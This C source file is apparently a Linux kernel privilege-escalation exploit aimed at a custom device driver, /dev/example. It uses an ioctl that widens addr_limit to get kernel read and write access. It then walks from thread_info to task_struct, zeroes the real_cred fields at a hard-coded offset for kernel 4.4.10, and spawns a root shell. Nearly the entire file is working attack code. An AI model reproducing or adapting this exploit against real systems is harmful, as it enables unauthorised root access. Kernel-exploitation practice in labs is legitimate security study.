#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/ioctl.h>
#include<fcntl.h>
#include "template.h"

//author : afang
//comment: what a nice day, isn't it?!

int main(){

	//interact with kernel module to test if module is effective..
	char *file = "/dev/example";
	char *buf = "test String...\n";
	struct temp{
		size_t len;
		char* buf;
		char* addr;
	}test;

	int fd = open(file, O_RDWR);
	struct temp* p1 = &test;
	p1->buf = (char*)malloc(0x20);
	//trigger output of stack addr for testing...
	ioctl(fd, 5, (size_t)p1); //right now, addr_limit has been modified into all spaces...
	//try to access kernel space...	
	char *caster = (char*)malloc(0x30);
	//direct access of kernel memory would result in crashing...
	//memcpy(caster, (size_t*)0xffffffff810a1c50, 10);	
	//utilize pipe to control read & write...
	pipe(pipefd);
	//test read from kernel...
//	kernel_memcpy(caster, (size_t*)0xffffffff810a1c50, 0x10);

	printf("Accepting input..\n");
	//Get hex value from dmesg input , turn it from str to integers...
	read(0, caster, 16);
	size_t thread_info_addr = (size_t)strtoul(caster, NULL, 16);
	
	//now, after acquiring of addr of thread_info, get task_struct addr secondly.
	//use kernel_memcpy to read mem from kernel. 
	kernel_memcpy(caster, (size_t*)(thread_info_addr - 0x18), 8);
	size_t t2 = *(size_t*)caster; //t2 points to task_struct base addr.
	//now, caster stores address of task_struct.
	//we, then can locate real_cred of current task_struct by accessing 0x5e8 here in 4.4.10.
	kernel_memcpy(caster, (size_t*)(*(size_t*)caster + 0x5e8), 8);
	//modify caster's first 0x1c bytes , set them to zeros to complete privilege escalation...
	char *buf2 = (char*)malloc(0x20);
	memset(buf2, 0, 0x20);
	kernel_memcpy((size_t*)(*(size_t*)caster), buf2, 0x1c);
	//it seems that the overwrites of real_cred is really enough for getting root privilege.
	//now, make task_struct->cred points to real_cred;
	//kernel_memcpy((size_t*)(t2+0x5f0), (size_t*)(t2+0x5e8), 8);
	
	//start shell.
	system("/bin/sh");
	
	return 0;
}
